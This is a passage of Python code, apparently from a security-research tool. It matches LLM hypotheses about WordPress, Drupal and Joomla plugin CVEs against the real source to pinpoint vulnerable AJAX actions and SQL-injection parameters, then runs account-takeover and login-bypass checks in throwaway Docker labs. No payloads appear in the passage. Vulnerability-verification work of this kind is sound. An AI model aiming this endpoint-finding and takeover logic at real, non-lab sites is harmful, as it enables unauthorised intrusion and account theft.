            # nunca llega a wpverify y cae al lab genérico de Python/PostgreSQL.
            if (fr.kind == "git"
                    and "wordpress" in inv.description.lower()
                    and "plugin" in inv.description.lower()):
                from .websource import looks_like_wp_slug as _lwps
                _url_seg = source.rstrip("/").split("/")[-1] if source and "://" in source else ""
                if _url_seg and _lwps(_url_seg) and _url_seg != source:
                    _fr_wp = fetch_source(_url_seg, version=version, on_step=step,
                                          cms_hint="wordpress",
                                          exclusive_upper_bound=version_exclusive)
                    if _fr_wp.ok and _fr_wp.kind == "wordpress-plugin":
                        step((f"re-ruteado a WordPress.org/{_url_seg} (la URL de GitHub se "
                              f"clono como 'git' pero el CVE es de un plugin de WordPress)") if es else
                             (f"re-routed to WordPress.org/{_url_seg} (GitHub URL cloned as "
                              f"'git' but CVE is a WordPress plugin CVE)"))
                        fr = _fr_wp
                        source = _url_seg
            step(f"codigo obtenido ({fr.kind}, version {fr.resolved_version or '?'})" if es else
                 f"source fetched ({fr.kind}, version {fr.resolved_version or '?'})")
            # calculado AQUI (no solo mas abajo, donde lo usa el despacho de verificacion
            # dinamica) porque el refinamiento determinista de endpoint/parametros TAMBIEN
            # necesita saber de que CMS es: Drupal (routing.yml) y Joomla ($input->getXxx()) se
            # leen distinto que WordPress (add_action/register_rest_route).
            plugin_dir = fr.plugin_dir or (fr.source if fr.kind in ("wordpress-plugin", "drupal-module") else "")
            inv.source_fetch["plugin_dir"] = plugin_dir
            is_drupal = fr.kind == "drupal-module" or (
                fr.kind in ("local-zip", "zip-url") and _looks_like_drupal_module(fr.local_path, plugin_dir))
            is_joomla = (not is_drupal) and fr.kind in ("local-zip", "zip-url") and _looks_like_joomla_extension(
                fr.local_path, plugin_dir)
            companion_plugins = []
            if not is_drupal and not is_joomla:
                companion_plugins = detect_required_companion_plugins(fr.local_path, plugin_dir)
                if companion_plugins:
                    step((f"el plugin requiere que {', '.join(companion_plugins)} este(n) "
                         f"activo(s) para cargar su propia funcionalidad (detectado en el "
                         f"codigo real) -- se instalaran en el laboratorio antes de atacar" if es
                         else
                         (f"the plugin requires {', '.join(companion_plugins)} to be active to "
                         f"load its own functionality (detected in the real source) -- will be "
                         f"installed in the lab before attacking")))
            # calculado AQUI, UNA vez, para que CUALQUIER tecnica dinamica de WordPress (no solo
            # SQLi, donde se encontro por primera vez) pueda pasarlo a _bootstrap_lab -- crea una
            # pagina real con el shortcode del plugin de la que _auto_resolve_wp_blockers rasca
            # un nonce especifico de una accion AJAX concreta, cuando ninguna pagina generica
            # (login, portada) lo tiene -- confirmado en vivo, CVE-2024-1071 (ver
            # verify_wordpress_sqli, que recalcula su propia version mas afinada con el fichero
            # GROUNDED mas abajo; esta generica basta para las demas tecnicas, que antes de esto
            # ni siquiera podian pedir esta pagina).
            from .websource import find_shortcode_name as _find_shortcode_name_generic
            shortcode_name_generic = (_find_shortcode_name_generic(fr.local_path, plugin_dir)
                                      if not is_drupal and not is_joomla else None)
            # igual que shortcode_name_generic, calculado UNA vez para CUALQUIER tecnica
            # dinamica de WordPress (antes solo existia para SQLi) -- ver keep_lab_on_failure
            # en wpverify.py/_finalize_lab.
            keep_lab_on_failure = bool(notes.get("keep_lab_on_failure"))
            if fn_names:
                step("confirmando en el codigo real las funciones citadas por el LLM..." if es else
                     "confirming the LLM-cited functions in the real source...")
                g = grep_vulnerable_functions(fr.local_path, fn_names)
                inv.source_grounding = {
                    "found": {k: [f"{m.file}:{m.line}" for m in v] for k, v in g["found"].items()},
                    "not_found": g["not_found"],
                }
                for name, locs in inv.source_grounding["found"].items():
                    step((f"GROUNDED: '{name}' existe en el codigo real -> {locs[0]}" if es else
                          f"GROUNDED: '{name}' exists in the real source -> {locs[0]}"))
                if inv.source_grounding["not_found"]:
                    nf = ", ".join(inv.source_grounding["not_found"])
                    step((f"no localizadas en el codigo descargado: {nf} (puede ser otra version/"
                          f"nombre, o hipotesis del LLM)" if es else
                          f"not found in the fetched source: {nf} (could be a different version/"
                          f"name, or an LLM hypothesis)"))
                # la hipotesis del LLM sobre vulnerable_functions a veces no acierta con el nombre
                # (confirmado en vivo, CVE-2024-50508: dijo 'handle_file_upload', esa funcion no
                # existe en el plugin real) aunque el resto de la hipotesis sea correcto. Si ya
                # conocemos el valor REAL de 'action' (del PoC crudo o de la hipotesis), no hace
                # falta depender de la adivinanza del LLM: se busca directamente el callback
                # registrado para esa accion (add_action('wp_ajax_<action>', ...)) en el codigo.
                if not inv.source_grounding["found"] and not is_drupal and not is_joomla:
                    known_action = _extract_known_ajax_action(notes)
                    if known_action:
                        step((f"ninguna funcion citada se confirmo -- buscando el handler real "
                             f"registrado para la accion ya conocida '{known_action}' "
                             f"(add_action('wp_ajax_{known_action}', ...))..." if es else
                             (f"no cited function was confirmed -- looking for the real handler "
                             f"registered for the already-known action '{known_action}' "
                             f"(add_action('wp_ajax_{known_action}', ...))...")))
                        from .websource import find_ajax_handler_function
                        recovered = find_ajax_handler_function(fr.local_path, known_action)
                        if recovered:
                            step((f"RECUPERADO: el handler real de '{known_action}' es "
                                 f"'{recovered['function']}' -> {recovered['location']} "
                                 f"(no la funcion que adivino el LLM)" if es else
                                 (f"RECOVERED: the real handler for '{known_action}' is "
                                 f"'{recovered['function']}' -> {recovered['location']} "
                                 f"(not the function the LLM guessed)")))
                            inv.source_grounding["found"] = {recovered["function"]: [recovered["location"]]}
                        else:
                            step((f"no se encontro ningun add_action registrado para "
                                 f"'{known_action}' en el codigo descargado" if es else
                                 f"no add_action registration for '{known_action}' was found in "
                                 f"the fetched source"))
                            # Fallback: el LLM adivino un nombre de accion que no existe en el
                            # codigo real. Estrategia en dos niveles:
                            # 1) Si el LLM propuso un sqli_param conocido, buscar la accion cuyo
                            #    handler usa ese parametro POST directamente en el codigo real
                            #    (find_ajax_action_for_param: el metodo mas fiable, no depende de
                            #    la similitud de nombres).
                            # 2) Si no hay sqli_param o no dio resultado, caer al scoring de
                            #    similitud de nombres entre known_action y las acciones reales.
                            from .websource import find_all_ajax_actions, find_ajax_action_for_param
                            _sqli_p = (notes.get("sqli_param") or
                                       notes.get("vulnerable_parameter") or "").strip()
                            _param_action = None
                            # Buscar la accion real por parametro POST: primero sqli_param del LLM,
                            # luego cada parametro de notes["parameters"], luego params DataTables
                            # comunes -- cubre el caso habitual en que el LLM no extrae sqli_param
                            # pero si conoce el parametro vulnerable (order[0][dir], etc.).
                            # nonce/token/security params appear in EVERY AJAX handler (every
                            # handler verifies its nonce). Using them to identify the vulnerable
                            # action produces false matches — confirmed in live lab: CVE-2024-1071
                            # (UM), nonce search returned um_secure_scan_affected_users instead of
                            # um_get_members. Defer them to the end of the candidate list so
                            # plugin-specific params always win.
                            _GENERIC_AUTH_PARAMS = frozenset(
                                ("nonce", "security", "_nonce", "_wpnonce", "token",
                                 "_token", "csrf", "verify"))
                            _pts: list = []
                            _pts_deferred: list = []
                            if _sqli_p:
                                if _sqli_p.lower() in _GENERIC_AUTH_PARAMS:
                                    _pts_deferred.append(_sqli_p)
                                else:
                                    _pts.append(_sqli_p)
                            for _pp in (notes.get("parameters") or []):
                                _pps = str(_pp).strip() if _pp else ""
                                if not _pps or _pps in _pts or _pps in _pts_deferred:
                                    continue
                                if _pps.lower() in _GENERIC_AUTH_PARAMS:
                                    _pts_deferred.append(_pps)
                                else:
                                    _pts.append(_pps)
                            for _pp in ("order", "start", "length", "draw", "search",
                                        "columns", "id", "post_id", "user_id",
                                        "orderby", "dir"):
                                if _pp not in _pts and _pp not in _pts_deferred:
                                    _pts.append(_pp)
                            # Deferred nonce/token params: last resort only — they appear in
                            # every AJAX handler and produce false matches (see comment above).
                            for _pp in _pts_deferred:
                                if _pp not in _pts:
                                    _pts.append(_pp)
                            _found_via_p = ""
                            for _cand_p in _pts:
                                _r = find_ajax_action_for_param(fr.local_path, _cand_p)
                                if _r:
                                    _param_action = _r
                                    _found_via_p = _cand_p
                                    break
                            if _param_action:
                                step((f"accion AJAX encontrada directamente en el codigo "
                                      f"real por el parametro POST '{_found_via_p}': "
                                      f"'{_param_action}' -- actualizando endpoint" if es else
                                      (f"AJAX action found directly in source by POST param "
                                      f"'{_found_via_p}': '{_param_action}' -- updating endpoint")))
                                old_ep = notes.get("endpoint") or ""
                                if "action=" in old_ep:
                                    import urllib.parse as _up
                                    _qs = dict(_up.parse_qsl(old_ep.split("?", 1)[-1]))
                                    _qs["action"] = _param_action
                                    _base = old_ep.split("?", 1)[0]
                                    notes["endpoint"] = _base + "?" + _up.urlencode(_qs)
                                else:
                                    notes["endpoint"] = (old_ep.rstrip("?&") +
                                                         ("?" if "?" not in old_ep else "&") +
                                                         f"action={_param_action}")
                                notes["ajax_action"] = _param_action
                                notes["http_method"] = "POST"  # AJAX siempre se llama via POST
                                inv.llm_notes["ajax_action"] = _param_action
                                inv.llm_notes["http_method"] = "POST"
                                inv.llm_notes["endpoint"] = notes["endpoint"]
                                # propagamos tambien sqli_param para que el verificador SQLi lo
                                # use directamente sin tener que adivinarlo de nuevo.
                                if _found_via_p and not notes.get("sqli_param"):
                                    notes["sqli_param"] = _found_via_p
                                    inv.llm_notes["sqli_param"] = _found_via_p
                                _rec2 = find_ajax_handler_function(fr.local_path, _param_action)
                                if _rec2:
                                    inv.source_grounding["found"] = {
                                        _rec2["function"]: [_rec2["location"]]}
                            all_actions = find_all_ajax_actions(fr.local_path)
                            if all_actions and not _param_action:
                                step((f"escaneando las {len(all_actions)} acciones AJAX reales "
                                     f"del plugin para encontrar la mas parecida a "
                                     f"'{known_action}'..." if es else
                                     (f"scanning the {len(all_actions)} real AJAX actions of the "
                                     f"plugin to find the closest match to '{known_action}'...")))
                                # seleccionar la accion con mayor similitud al nombre propuesto.
                                # Scoring: por cada palabra del nombre propuesto, se busca la
                                # mejor coincidencia en las palabras de la accion candidata --
                                # coincidencia exacta (1.0) o prefijo comun de >=3 chars
                                # (proporcion del prefijo sobre la palabra mas larga). La puntuacion
                                # total se normaliza por el numero de palabras de la CANDIDATA para
                                # penalizar las acciones largas que coinciden por tener muchas
                                # palabras ('delete_all_logs' gana a 'loglist' en coincidencia
                                # exacta de 'logs', pero la normalizacion inclina la balanza a favor
                                # de la accion mas corta y enfocada que coincide en la misma
                                # proporcion de sus palabras totales).
                                _known_words = set(re.split(r'[_-]', known_action.lower()))

                                def _lcp_len(a: str, b: str) -> int:
                                    n = 0
                                    for x, y in zip(a, b):
                                        if x == y:
                                            n += 1
                                        else:
                                            break
                                    return n

                                def _score(act: str) -> float:
                                    act_wds = list(set(re.split(r'[_-]', act.lower())))
                                    if not act_wds:
                                        return 0.0
                                    total = 0.0
                                    for kw in _known_words:
                                        best_w = 0.0
                                        for aw in act_wds:
                                            if kw == aw:
                                                best_w = max(best_w, 1.0)
                                            else:
                                                lcp = _lcp_len(kw, aw)
                                                if lcp >= 3:
                                                    best_w = max(best_w, lcp / max(len(kw), len(aw)))
                                        total += best_w
                                    return total / len(act_wds)

                                best = max(all_actions, key=_score)
                                if _score(best) > 0:
                                    step((f"accion AJAX mas parecida en el codigo real: "
                                         f"'{best}' (puntuacion normalizada: "
                                         f"{_score(best):.3f}) -- "
                                         f"actualizando endpoint" if es else
                                         (f"closest AJAX action in the real code: '{best}' "
                                         f"(normalized score: {_score(best):.3f}) "
                                         f"-- updating endpoint")))
                                    # actualizar notes con la accion real
                                    old_ep = notes.get("endpoint") or ""
                                    if "action=" in old_ep:
                                        import urllib.parse as _up
                                        _qs = dict(_up.parse_qsl(old_ep.split("?", 1)[-1]))
                                        _qs["action"] = best
                                        _base = old_ep.split("?", 1)[0]
                                        notes["endpoint"] = _base + "?" + _up.urlencode(_qs)
                                    else:
                                        notes["endpoint"] = (old_ep.rstrip("?&") +
                                                             ("?" if "?" not in old_ep else "&") +
                                                             f"action={best}")
                                    notes["ajax_action"] = best
                                    notes["http_method"] = "POST"  # AJAX siempre POST
                                    inv.llm_notes["ajax_action"] = best
                                    inv.llm_notes["http_method"] = "POST"
                                    inv.llm_notes["endpoint"] = notes["endpoint"]
                                    # buscar el handler de la nueva accion para grounding
                                    recovered2 = find_ajax_handler_function(fr.local_path, best)
                                    if recovered2:
                                        inv.source_grounding["found"] = {
                                            recovered2["function"]: [recovered2["location"]]}
                                        step((f"RECUPERADO: handler de '{best}' -> "
                                             f"'{recovered2['function']}' en "
                                             f"{recovered2['location']}" if es else
                                             (f"RECOVERED: handler of '{best}' -> "
                                             f"'{recovered2['function']}' at "
                                             f"{recovered2['location']}")))
                                else:
                                    step((f"ninguna de las {len(all_actions)} acciones AJAX "
                                         f"encontradas comparte palabras con '{known_action}' -- "
                                         f"se mantiene la hipotesis original" if es else
                                         (f"none of the {len(all_actions)} found AJAX actions "
                                         f"shares words with '{known_action}' -- keeping original "
                                         f"hypothesis")))
                    else:
                        # Sin LLM (o LLM sin accion AJAX en las notas): para CVEs de clase sqli
                        # en WordPress, escanear el plugin en busca de acciones AJAX que usen
                        # parametros DataTables comunes (order, start, etc.) y construir el
                        # endpoint determinista. Cubre el caso 'error-log-viewer-wp' sin Ollama.
                        if inv.vuln_class in ("sqli", "sql-injection"):
                            from .websource import find_all_ajax_actions, find_ajax_action_for_param
                            _pts_det = ["order", "start", "length", "draw", "search",
                                        "columns", "id", "post_id", "user_id", "orderby", "dir"]
                            _det_action = None
                            _det_param = ""
                            for _cand_p in _pts_det:
                                _r = find_ajax_action_for_param(fr.local_path, _cand_p)
                                if _r:
                                    _det_action = _r
                                    _det_param = _cand_p
                                    break
                            if _det_action:
                                step((f"escaner determinista encontro accion AJAX para SQLi: "
                                      f"'{_det_action}' (parametro '{_det_param}') -- "
                                      f"construyendo endpoint...") if es else
                                     (f"deterministic scan found AJAX action for SQLi: "
                                      f"'{_det_action}' (param '{_det_param}') -- "
                                      f"building endpoint..."))
                                _det_ep = f"/wp-admin/admin-ajax.php?action={_det_action}"
                                notes["endpoint"] = _det_ep
                                notes["ajax_action"] = _det_action
                                notes["http_method"] = "POST"
                                notes["sqli_param"] = _det_param
                                inv.llm_notes["endpoint"] = _det_ep
                                inv.llm_notes["ajax_action"] = _det_action
                                inv.llm_notes["http_method"] = "POST"
                                inv.llm_notes["sqli_param"] = _det_param
                                from .websource import find_ajax_handler_function
                                _det_rec = find_ajax_handler_function(fr.local_path, _det_action)
                                if _det_rec:
                                    inv.source_grounding["found"] = {
                                        _det_rec["function"]: [_det_rec["location"]]}
                                    step((f"handler: '{_det_rec['function']}' en "
                                          f"{_det_rec['location']}") if es else
                                         (f"handler: '{_det_rec['function']}' at "
                                          f"{_det_rec['location']}"))
                # con al menos una funcion confirmada de verdad: lee el codigo real alrededor y
                # pide al LLM que AFINE el endpoint/parametros a partir de el, en vez de quedarse
                # con la primera suposicion (hecha solo leyendo la descripcion de la CVE, que rara
                # vez cita el nombre exacto del action o de los parametros del formulario).
                if inv.source_grounding["found"]:
                    step("leyendo el codigo real para refinar endpoint/parametros..." if es else
                         "reading the real source to refine endpoint/parameters...")
                    llm_refined = _refine_web_hints_from_source(llm, fr.local_path,
                                                                inv.source_grounding["found"])
                    # grep deterministico del registro real del endpoint y de los parametros
                    # reales -- gana sobre la suposicion del LLM cuando ambos citan algo. Es
                    # exactamente la correccion que el analista tuvo que hacer a mano leyendo el
                    # codigo en CVE-2025-3605/CVE-2024-43982, ahora automatica -- y, desde aqui,
                    # para los tres CMS (cada uno se registra de forma distinta: add_action()/
                    # register_rest_route() en WordPress, *.routing.yml en Drupal, $input->getXxx()
                    # en Joomla).
                    if is_drupal:
                        det_refined = _deterministic_drupal_hints_from_source(
                            fr.local_path, inv.source_grounding["found"])
                    elif is_joomla:
                        det_refined = _deterministic_joomla_hints_from_source(
                            fr.local_path, inv.source_grounding["found"], plugin_dir)
                    else:
                        det_refined = _deterministic_web_hints_from_source(
                            fr.local_path, inv.source_grounding["found"])
                    refined = {**(llm_refined or {}), **(det_refined or {})}
                    if det_refined:
                        step((f"grep deterministico del codigo real: endpoint="
                             f"{det_refined.get('endpoint')}, parameters="
                             f"{det_refined.get('parameters')} (gana sobre la suposicion del "
                             f"LLM si discrepan)") if es else
                             (f"deterministic grep of the real source: endpoint="
                             f"{det_refined.get('endpoint')}, parameters="
                             f"{det_refined.get('parameters')} (wins over the LLM's guess if "
                             f"they disagree)"))
                    if refined:
                        notes = {**notes, **refined}
                        inv.llm_notes.update(refined)
                        step((f"refinado con el codigo real: endpoint={notes.get('endpoint')}, "
                             f"parameters={notes.get('parameters')}") if es else
                             (f"refined from the real source: endpoint={notes.get('endpoint')}, "
                             f"parameters={notes.get('parameters')}"))
                    else:
                        step("sin LLM disponible o sin nada que afinar: se mantiene la hipotesis "
                             "inicial" if es else "no LLM available or nothing to refine: keeping "
                             "the initial hypothesis")
            # Override determinista para WordPress SQLi: si un parametro de tipo DataTables
            # (order, dir, start, etc.) apunta directamente a una accion DISTINTA de la
            # actualmente seleccionada (via codigo real, no similitud de nombres), la accion
            # del codigo GANA -- evidencia directa mas fuerte que el scoring de similaridad.
            # Corrige el caso 'error-log-viewer-wp' donde el LLM escoge 'elvwp_log_download'
            # pero la accion vulnerable real es 'elvwp_datatable_loglist' (usa $_POST['order']).
            if (fr.ok and not is_drupal and not is_joomla and
                    inv.vuln_class in ("sqli", "sql-injection") and
                    notes.get("ajax_action")):
                from .websource import find_ajax_action_for_param as _fap_override
                _sqli_cands_ov = []
                _sqli_p_ov = (notes.get("sqli_param") or "").strip()
                if _sqli_p_ov:
                    _sqli_cands_ov.append(_sqli_p_ov.split("[")[0].strip("'\" "))
                for _pp_ov in ("order", "dir", "start", "orderby", "length", "draw"):
                    if _pp_ov not in _sqli_cands_ov:
                        _sqli_cands_ov.append(_pp_ov)
                for _cand_ov in _sqli_cands_ov:
                    if not _cand_ov or len(_cand_ov) < 2:
                        continue
                    _real_act_ov = _fap_override(fr.local_path, _cand_ov)
                    if _real_act_ov and _real_act_ov != notes["ajax_action"]:
                        step((f"parametro '{_cand_ov}' apunta directamente a "
                              f"'{_real_act_ov}' en el codigo real (accion actual: "
                              f"'{notes['ajax_action']}') -- sobreescribiendo con la "
                              f"accion correcta segun el codigo") if es else
                             (f"param '{_cand_ov}' points directly to '{_real_act_ov}' "
                              f"in real source (current action: '{notes['ajax_action']}') "
                              f"-- overriding with code-evidence action"))
                        _old_ep_ov = notes.get("endpoint") or ""
                        import re as _re_ov
                        if "action=" in _old_ep_ov:
                            _new_ep_ov = _re_ov.sub(r"action=[^&]*",
                                                     f"action={_real_act_ov}", _old_ep_ov)
                        else:
                            _new_ep_ov = f"/wp-admin/admin-ajax.php?action={_real_act_ov}"
                        notes["ajax_action"] = _real_act_ov
                        notes["endpoint"] = _new_ep_ov
                        notes["sqli_param"] = _cand_ov
                        inv.llm_notes["ajax_action"] = _real_act_ov
                        inv.llm_notes["endpoint"] = _new_ep_ov
                        inv.llm_notes["sqli_param"] = _cand_ov
                        from .websource import find_ajax_handler_function as _fahf_ov
                        _rec_ov = _fahf_ov(fr.local_path, _real_act_ov)
                        if _rec_ov:
                            inv.source_grounding["found"] = {
                                _rec_ov["function"]: [_rec_ov["location"]]}
                            step((f"handler real: '{_rec_ov['function']}' en "
                                  f"{_rec_ov['location']}") if es else
                                 (f"real handler: '{_rec_ov['function']}' at "
                                  f"{_rec_ov['location']}"))
                        break
            # Ruta SIN LLM: el bloque 'if fn_names:' de arriba no corre cuando el LLM no esta
            # disponible (fn_names=[]) y deja notes["endpoint"] vacio. Para CVEs de clase sqli
            # en WordPress, escanear el plugin en busca de acciones AJAX SQLi-susceptibles y
            # construir el endpoint de forma determinista para que el verificador pueda lanzarse.
            if (fr.ok and not is_drupal and not is_joomla and not fn_names
                    and not notes.get("endpoint")
                    and inv.vuln_class in ("sqli", "sql-injection")):
                from .websource import find_all_ajax_actions, find_ajax_action_for_param
                _noLLM_pts = ["order", "start", "length", "draw", "search",
                               "columns", "id", "post_id", "user_id", "orderby", "dir"]
                _noLLM_action = None
                _noLLM_param = ""
                for _cand_p in _noLLM_pts:
                    _r = find_ajax_action_for_param(fr.local_path, _cand_p)
                    if _r:
                        _noLLM_action = _r
                        _noLLM_param = _cand_p
                        break
                if _noLLM_action:
                    step((f"escaner determinista (sin LLM) encontro accion AJAX SQLi: "
                          f"'{_noLLM_action}' (parametro POST '{_noLLM_param}') -- "
                          f"construyendo endpoint...") if es else
                         (f"deterministic scan (no LLM) found SQLi AJAX action: "
                          f"'{_noLLM_action}' (POST param '{_noLLM_param}') -- "
                          f"building endpoint..."))
                    _noLLM_ep = f"/wp-admin/admin-ajax.php?action={_noLLM_action}"
                    notes["endpoint"] = _noLLM_ep
                    notes["ajax_action"] = _noLLM_action
                    notes["http_method"] = "POST"
                    notes["sqli_param"] = _noLLM_param
                    inv.llm_notes["endpoint"] = _noLLM_ep
                    inv.llm_notes["ajax_action"] = _noLLM_action
                    inv.llm_notes["http_method"] = "POST"
                    inv.llm_notes["sqli_param"] = _noLLM_param
                    from .websource import find_ajax_handler_function
                    _noLLM_rec = find_ajax_handler_function(fr.local_path, _noLLM_action)
                    if _noLLM_rec:
                        inv.source_grounding["found"] = {
                            _noLLM_rec["function"]: [_noLLM_rec["location"]]}
                        step((f"handler: '{_noLLM_rec['function']}' en "
                              f"{_noLLM_rec['location']}") if es else
                             (f"handler: '{_noLLM_rec['function']}' at "
                              f"{_noLLM_rec['location']}"))
                        # Refinar parametros con grep deterministico (extrae order[0][dir] etc.)
                        det_no_llm = _deterministic_web_hints_from_source(
                            fr.local_path, inv.source_grounding["found"])
                        if det_no_llm:
                            notes = {**notes, **det_no_llm}
                            inv.llm_notes.update(det_no_llm)
                            step((f"grep deterministico (sin LLM): endpoint="
                                  f"{det_no_llm.get('endpoint')}, parameters="
                                  f"{det_no_llm.get('parameters')}") if es else
                                 (f"deterministic grep (no LLM): endpoint="
                                  f"{det_no_llm.get('endpoint')}, parameters="
                                  f"{det_no_llm.get('parameters')}"))
            # verificacion DINAMICA: solo para el caso concreto que wpverify.py sabe confirmar de
            # verdad (account-takeover por missing-authorization/idor en un plugin de WordPress).
            # Cualquier fuente que de verdad trajo codigo de un plugin sirve -- no solo
            # WordPress.org: un .zip comercial (local o por URL) es el caso REAL mas comun (la
            # mayoria de plugins con CVEs de este tipo son de pago, nunca estaran en el directorio
            # gratuito). `plugin_dir`/`is_drupal`/`is_joomla` ya se calcularon mas arriba (los
            # necesitaba tambien el refinamiento determinista de endpoint/parametros).
            if (is_joomla and fr.kind in ("local-zip", "zip-url") and plugin_dir
                    and inv.vuln_class in ("missing-authorization", "idor") and notes.get("endpoint")):
                # primer verificador de Joomla ("poco a poco" -- ver joomlaverify.py): mismo caso
                # de account-takeover que abrio el soporte de WordPress y Drupal, con el CLI
                # oficial de Joomla + un Joomla+MySQL efimeros en Docker. No hay resolucion de
                # catalogo todavia (Joomla no tiene un API publico simple como WordPress.org/
                # Drupal.org) -- --source debe ser un .zip local/URL o un repo git por ahora.
                from .joomlaverify import verify_joomla_account_takeover, _pick_param
                from .wpverify import _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS
                params = notes.get("parameters") or []
                id_p = notes.get("id_param") or _pick_param(params, _ID_HINTS)
                email_p = notes.get("email_param") or _pick_param(params, _EMAIL_HINTS)
                pass_p = notes.get("pass_param") or _pick_param(params, _PASS_HINTS)
                if not (email_p or pass_p):
                    inv.blockers.append(("verificacion dinamica no intentada: la hipotesis no "
                                         "trae un parametro de email/password reconocible; afina "
                                         "'parameters' en la hipotesis del LLM o pasalos a mano"
                                         if es else
                                         "dynamic verification not attempted: the hypothesis has "
                                         "no recognizable email/password parameter; refine "
                                         "'parameters' in the LLM hypothesis or pass them by hand"))
                else:
                    step(("intentando verificacion DINAMICA -- Joomla+MySQL efimero en Docker "
                         "(CLI oficial de Joomla)..." if es else
                         "attempting DYNAMIC verification -- ephemeral Joomla+MySQL in Docker "
                         "(official Joomla CLI)..."))
                    wr = verify_joomla_account_takeover(
                        fr.local_path, plugin_dir, notes.get("endpoint"),
                        notes.get("http_method") or "POST", params,
                        id_param_hint=id_p or "", email_param_hint=email_p or "",
                        pass_param_hint=pass_p or "", on_step=step, budget_s=budget_s)
                    _apply_wpverify_result(inv, wr, es, llm)
            elif (is_drupal and fr.kind in ("drupal-module", "local-zip", "zip-url") and plugin_dir
                    and inv.vuln_class in ("missing-authorization", "idor") and notes.get("endpoint")):
                # primer verificador de Drupal ("poco a poco" -- ver drupalverify.py): mismo caso
                # de account-takeover que abrio el soporte de WordPress, con Drush+un Drupal+
                # MySQL efimeros en vez de wp-cli+WordPress. Las demas clases (path-traversal,
                # sqli...) siguen siendo WordPress-only por ahora.
                from .drupalverify import verify_drupal_account_takeover, _pick_param
                from .wpverify import _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS
                params = notes.get("parameters") or []
                id_p = notes.get("id_param") or _pick_param(params, _ID_HINTS)
                email_p = notes.get("email_param") or _pick_param(params, _EMAIL_HINTS)
                pass_p = notes.get("pass_param") or _pick_param(params, _PASS_HINTS)
                if not (email_p or pass_p):
                    inv.blockers.append(("verificacion dinamica no intentada: la hipotesis no "
                                         "trae un parametro de email/password reconocible; afina "
                                         "'parameters' en la hipotesis del LLM o pasalos a mano"
                                         if es else
                                         "dynamic verification not attempted: the hypothesis has "
                                         "no recognizable email/password parameter; refine "
                                         "'parameters' in the LLM hypothesis or pass them by hand"))
                else:
                    step(("intentando verificacion DINAMICA -- Drupal+MySQL efimero en Docker "
                         "(Drush)..." if es else
                         "attempting DYNAMIC verification -- ephemeral Drupal+MySQL in Docker "
                         "(Drush)..."))
                    wr = verify_drupal_account_takeover(
                        fr.local_path, plugin_dir, notes.get("endpoint"),
                        notes.get("http_method") or "POST", params,
                        id_param_hint=id_p or "", email_param_hint=email_p or "",
                        pass_param_hint=pass_p or "", on_step=step, budget_s=budget_s)
                    _apply_wpverify_result(inv, wr, es, llm)
            elif (not is_drupal and not is_joomla and fr.kind in ("wordpress-plugin", "local-zip", "zip-url") and plugin_dir
                    # "auth-bypass" incluido junto a missing-authorization/idor: bug real
                    # encontrado en vivo con CVE-2026-2991 (KiviCare) -- classify_cve() clasifica
                    # un aviso que literalmente dice "authentication bypass" como "auth-bypass"
                    # (su propia categoria, ver cveplan.py), NUNCA como missing-authorization/
                    # idor aunque --vuln-class missing-authorization se pase a mano: classify_cve
                    # se prueba primero sobre la DESCRIPCION real del aviso, que gana. Las tres
                    # tecnicas de esta rama (account-takeover/direct-login-as/unauthenticated-
                    # login-bypass) son, en el fondo, formas de missing-authorization de todos
                    # modos -- un login bypass no autenticado ES una forma de auth-bypass Y de
                    # missing-authorization a la vez.
                    and inv.vuln_class in ("missing-authorization", "idor", "auth-bypass")
                    and notes.get("endpoint")):
                # el mecanismo exacto de account-takeover no es siempre el mismo (ver wpverify.py):
                # unos plugins te dejan CAMBIAR la password/email de otro usuario (confirmable con
                # un segundo login), otros te dejan CONVERTIRTE DIRECTAMENTE en su sesion sin tocar
                # ninguna credencial (p.ej. CVE-2024-43982 en Login As Users). No se le pide al
                # analista que lo sepa de antemano: se deriva de la FORMA de los parametros que la
                # hipotesis del LLM (o los hints) ya trae -- si hay un parametro de email/password,
                # es el primer caso; si solo hay un ID objetivo, el segundo.
                from .wpverify import (verify_wordpress_account_takeover,
                                       verify_wordpress_direct_login_as,
                                       verify_wordpress_unauthenticated_login_bypass, _pick_param,
                                       _ID_HINTS, _EMAIL_HINTS, _PASS_HINTS)
                params = notes.get("parameters") or []
                # preferir el mapeo de rol que el LLM extrajo LEYENDO el codigo real (mas fiable
                # que adivinar por el nombre del parametro); cae a la heuristica por nombre si no
                # hay refinamiento (sin LLM, o el refinamiento no incluyo esa clave).
                id_p = notes.get("id_param") or _pick_param(params, _ID_HINTS)
                email_p = notes.get("email_param") or _pick_param(params, _EMAIL_HINTS)
                pass_p = notes.get("pass_param") or _pick_param(params, _PASS_HINTS)
                wr = None
                # TERCERA forma, distinta de las dos de abajo: NINGUNA sesion previa hace falta
                # (confirmado en vivo, CVE-2026-2991/KiviCare) -- nunca se adivina sola a partir
                # de la forma de los parametros (un email+password aqui no implica el patron de
                # "cambiar la credencial de otro" de mas abajo: ver verify_wordpress_
                # unauthenticated_login_bypass, el propio CVE usa 'password' como un token social
                # jamas validado, no como una password nueva que fijar) -- exige el hint explicito
                # unauthenticated_login_bypass (de --unauthenticated-login-bypass) porque solo el
                # analista que leyo el aviso real sabe que el endpoint es publico.
                # EXTENSION (CVE-2026-2991/KiviCare): si hay email_p pero NO id_p, el patron
                # es "social-login bypass" (te autentican con solo saber el email de un usuario
                # ya registrado, sin ID de victima ni cambio de credencial) -- se trata igual
                # que unauthenticated_login_bypass aunque el hint explicito no este presente.
                _is_social_login_bypass = (email_p and not id_p
                                           and not (pass_p and id_p))
                if notes.get("unauthenticated_login_bypass") or _is_social_login_bypass:
                    step(("intentando verificacion DINAMICA -- login bypass SIN NINGUNA sesion "
                         "previa (WordPress+MySQL efimero en Docker)..." if es else
                         "attempting DYNAMIC verification -- login bypass with NO prior session "
                         "at all (ephemeral WordPress+MySQL in Docker)..."))
                    wr = verify_wordpress_unauthenticated_login_bypass(
                        fr.local_path, plugin_dir, notes.get("endpoint"),
                        notes.get("http_method") or "POST", params,
                        email_param_hint=email_p or "",
                        victim_role=notes.get("victim_role") or "subscriber",
                        on_step=step, budget_s=budget_s, companion_plugins=companion_plugins,
                        shortcode_name=shortcode_name_generic,
                        keep_lab_on_failure=keep_lab_on_failure)
                elif email_p or pass_p:
                    step(("intentando verificacion DINAMICA -- patron de cambio de credencial "
                         "(WordPress+MySQL efimero en Docker)..." if es else
                         "attempting DYNAMIC verification -- credential-change pattern "
                         "(ephemeral WordPress+MySQL in Docker)..."))
                    wr = verify_wordpress_account_takeover(
